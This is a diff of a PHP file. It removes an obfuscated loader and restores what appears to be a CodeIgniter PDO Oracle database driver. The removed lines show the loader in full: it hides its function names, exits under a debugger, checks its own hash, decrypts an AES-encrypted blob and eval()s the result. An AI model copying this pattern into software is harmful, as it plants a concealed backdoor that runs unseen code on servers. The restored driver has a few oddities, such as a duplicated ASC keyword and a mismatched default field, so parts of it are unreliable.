@@ -1,28 +1,284 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_zcahsixn=('bas'.'e64'.'_de'.'cod'.'e');
-$_kteb1wwd=('gzu'.'nco'.'mpr'.'ess');
-$_cv5blkx1=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_k90x6pqd='o66z8xwL';
-$_d02ul5h0='nL22Rdie';
-$_jghuyoin='8vhRYtMz';
-$_tuluu2lo='HpYsvguD';
-$_r1yeayfw='MqV09vXz1oc=';
-$_ehesfiez='tjEbcSiH';
-$_x2aqtkis='RXX+iakz';
-$_cpr89h7h='gz+QLQ==';
-$_s8rl4gns=$_zcahsixn($_d02ul5h0.$_jghuyoin.$_tuluu2lo.$_k90x6pqd.$_r1yeayfw);
-$_sgov0s7f=$_zcahsixn($_ehesfiez.$_x2aqtkis.$_cpr89h7h);
-$_oq0ybdme=$_zcahsixn('0l0+5y/jTO9v2roz7IaJ3BdiNOo1Zq7aaKCt+Vfu6gDR+T2h1rcfxp+rzLgsfQKjOSyYdy175yjIF/RzxTOP6DY0Sz4lHq44OH9RuKg66fVywvGHRbi27fJyInhLZgpdk4I9ENB+vRlLgS40qW479JY41QH65qI/ptMPQ5T2eRGuXsi7lb1T992loaN7GZGLL4PzVHbAHuEJghhkcOH25D1lkiVgrQrJGDrDKZhUXDZkH6L+zwpiQRcp6qt7hqLAjhxLOjL5FfoLSOaaFlBgev/wLrXVcpYCxcaQQSioK7AERyxUS5+TtJFqAT0S6VRq3Iygd0/xiKbtl2iAM5BBAyH2tyt6BLFPLlK67jLDU8qd4zq6UYd/4SHtg0DPw2YSw7Pr7AiaSifHF2XmFMkJgIAfXpsvIcPN/sUMRBxpVZnfggKeN4O/NIBd8vBm0TnV40kmY8qSz/BVJrgoZRiaw0/qjiG4fxmL9UltneCl1pmQs9Xgihascq8O1hP+X+ImIXThnXr2wjb/Dji021Z2gT99Ar+XjNZgmbqa8765WFAvgTg7/kCOknG2uPvmBhCH/msNnDF71/n+DW8lR3FCrXtY8y2fAUTLglUOOu1PmBI2K7ZDRS8uguptwet6d+SSTlQemDuRkb64nqhMZ6rC5x4uULqC18p3cD65pd7Whknk1o5Mp/Reb5/o+JPr+NU4ZmwCBn/j6fQYwa/Lqrcr9vAT0QnHm4z8f04VzzhjUfNRCSfNacC2bdUVMVUYXQ2iPhkOb3ORcRBiOrYgYccPOwO44yx1/CKtq36lal+kTGC8x0mp4KwcbGyDDGy+b77Z+VHBpWrxXbx9Jl/077LBYyTPc/UmdzlGmhSqI4P4D7T9P7Aqb3NnnDUbyh5WettQJOwLsh4sanYdGJU5LOpM2LWRUgX71Ilnnesie1Toja941C7V8O4nfC3eiZp4kF1rtI+Qz5hpuKReS5L47VStY1w8X1cBfIxw896uEh21GmqTAGGTGTPmtfVLvJm6m7dOi57bHyW04pwV79TTr4UFTs2W1glKm4E6HgSbOqo/xb5BVe3E6QTxGFAAYD8dHYcKn5KPIYAyI1H3MpS0KIheEWeTVJI/Eb5048oDP9drMPUxKQpbJJs5yx+Lqs+EUPxt2YGMVkCsuBhGIicnZCji9OHAgdDMxIEkCvMVlzVSUXdjISKdw3nj/CDxVMe5aZDa02MSj1g4Z+6aWr27ad+eM9PkyKJMdHATReWZewnnoVn6EL0Bc9xpRE006eFA9McuHusFbPJcUYet5VIxQqu0jT44B8Ada0r6RYdc5pXVwcefV6aIr1Ry36Gz4FuOWhjs13wKKhWgmPNzkpXh87uOPA7VtQBGovscT7Oh/5H3Z8NTKu89SiWQo+hfZPtgfCploowgkmxIJhMF2hxBRakK8QvVFlzBaKt7iTVLDDsZVl95b46rEeoqpoAjiarrrSaPbJSa36BYz54j0fML2PQDHsnQwDk7dMdhB+UJP4dz/J/N5XljjpQzZQNy1qZJwGn8BFQt78Ne3crgCElXipP47Pn7cdAyKoXg58oDlZpLGvaQb/wQvsmTQV2do5hGgTIMZPPIdheIs2fY9lG+pGVxPQF/pUBIx32irCIoPcBYk3I/3TABV6dFPU5BKDLXhUBMMwOdUp9cvHwdSDzbpi/F63lKwdnPZY6lM4zU1nVTbfc8v83UTKxxKL4IitNC/9gwgH5kcpdOe9df2ImSghcmeGrFZ++pNH3JDFtEcOgYI1viIyDSY9I9WfZYe6DGQBk8b5x6M1NnrYzFTKgJyPDoORr6ZCkOVcZW6/04B6Zl5nww1glwIcZtoeCZS2oYbwiA0TwWIxo8y3hOw2w5YGx8zFymHb1aHWoq0oTOK55cfGQ6yprDwrORkmRggIxxcJIG');
-$_w4rol45s=$_cv5blkx1($_oq0ybdme,'aes-256-cbc',$_s8rl4gns,OPENSSL_RAW_DATA,$_sgov0s7f);
-if($_w4rol45s===false){exit;}
-$_ky8cauaa=$_kteb1wwd($_w4rol45s);
-if($_ky8cauaa===false){exit;}
-$_wlfdo4o9='8879603588814aa651d2e84a24e95fc089902ee4f6297ade7dc4e7f8cadeaab3';
-$_f7kllf0w=@file_get_contents(__FILE__);
-if($_f7kllf0w!==false){
-$_pyjlg1ny=str_replace($_wlfdo4o9,"0000000000000000000000000000000000000000000000000000000000000000",$_f7kllf0w);
-$_ppoe7jdi=hash("sha256",$_pyjlg1ny);
-if($_ppoe7jdi!==$_wlfdo4o9){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_pdo_oci_driver extends CI_DB_pdo_driver {
+
+
+
+
+
+public $subdriver = 'oci';
+
+
+
+
+
+
+
+
+protected $_reserved_identifiers = array('*', 'rownum');
+
+
+
+
+
+protected $_random_keyword = array('ASC', 'ASC'); 
+
+
+
+
+
+
+
+
+protected $_count_string = 'SELECT COUNT(1) AS ';
+
+
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if (empty($this->dsn))
+{
+$this->dsn = 'oci:dbname=';
+
+
+if (empty($this->hostname) && empty($this->port))
+{
+$this->dsn .= $this->database;
 }
-eval($_ky8cauaa);
+else
+{
+$this->dsn .= '//'.(empty($this->hostname) ? '127.0.0.1' : $this->hostname)
+.(empty($this->port) ? '' : ':'.$this->port).'/';
+empty($this->database) OR $this->dsn .= $this->database;
+}
+empty($this->char_set) OR $this->dsn .= ';charset='.$this->char_set;
+}
+elseif ( ! empty($this->char_set) && strpos($this->dsn, 'charset=', 4) === FALSE)
+{
+$this->dsn .= ';charset='.$this->char_set;
+}
+}
+
+
+
+
+
+
+public function version()
+{
+if (isset($this->data_cache['version']))
+{
+return $this->data_cache['version'];
+}
+$version_string = parent::version();
+if (preg_match('#Release\s(?<version>\d+(?:\.\d+)+)#', $version_string, $match))
+{
+return $this->data_cache['version'] = $match[1];
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SELECT "TABLE_NAME" FROM "ALL_TABLES"';
+if ($prefix_limit === TRUE && $this->dbprefix !== '')
+{
+return $sql.' WHERE "TABLE_NAME" LIKE \''.$this->escape_like_str($this->dbprefix)."%' "
+.sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+if (strpos($table, '.') !== FALSE)
+{
+sscanf($table, '%[^.].%s', $owner, $table);
+}
+else
+{
+$owner = $this->username;
+}
+return 'SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS
+			WHERE UPPER(OWNER) = '.$this->escape(strtoupper($owner)).'
+				AND UPPER(TABLE_NAME) = '.$this->escape(strtoupper($table));
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+if (strpos($table, '.') !== FALSE)
+{
+sscanf($table, '%[^.].%s', $owner, $table);
+}
+else
+{
+$owner = $this->username;
+}
+$sql = 'SELECT COLUMN_NAME, DATA_TYPE, CHAR_LENGTH, DATA_PRECISION, DATA_LENGTH, DATA_DEFAULT, NULLABLE
+			FROM ALL_TAB_COLUMNS
+			WHERE UPPER(OWNER) = '.$this->escape(strtoupper($owner)).'
+				AND UPPER(TABLE_NAME) = '.$this->escape(strtoupper($table));
+if (($query = $this->query($sql)) === FALSE)
+{
+return FALSE;
+}
+$query = $query->result_object();
+$retval = array();
+for ($i = 0, $c = count($query); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = $query[$i]->COLUMN_NAME;
+$retval[$i]->type = $query[$i]->DATA_TYPE;
+$length = ($query[$i]->CHAR_LENGTH > 0)
+? $query[$i]->CHAR_LENGTH : $query[$i]->DATA_PRECISION;
+if ($length === NULL)
+{
+$length = $query[$i]->DATA_LENGTH;
+}
+$retval[$i]->max_length = $length;
+$default = $query[$i]->DATA_DEFAULT;
+if ($default === NULL && $query[$i]->NULLABLE === 'N')
+{
+$default = '';
+}
+$retval[$i]->default = $query[$i]->COLUMN_DEFAULT;
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+protected function _insert_batch($table, $keys, $values)
+{
+$keys = implode(', ', $keys);
+$sql = "INSERT ALL\n";
+for ($i = 0, $c = count($values); $i < $c; $i++)
+{
+$sql .= '	INTO '.$table.' ('.$keys.') VALUES '.$values[$i]."\n";
+}
+return $sql.'SELECT * FROM dual';
+}
+
+
+
+
+
+
+
+
+
+protected function _delete($table)
+{
+if ($this->qb_limit)
+{
+$this->where('rownum <= ',$this->qb_limit, FALSE);
+$this->qb_limit = FALSE;
+}
+return parent::_delete($table);
+}
+
+
+
+
+
+
+
+
+
+protected function _limit($sql)
+{
+if (version_compare($this->version(), '12.1', '>='))
+{
+
+empty($this->qb_orderby) && $sql .= ' ORDER BY 1';
+return $sql.' OFFSET '.(int) $this->qb_offset.' ROWS FETCH NEXT '.$this->qb_limit.' ROWS ONLY';
+}
+return 'SELECT * FROM (SELECT inner_query.*, rownum rnum FROM ('.$sql.') inner_query WHERE rownum < '.($this->qb_offset + $this->qb_limit + 1).')'
+.($this->qb_offset ? ' WHERE rnum >= '.($this->qb_offset + 1): '');
+}
+}
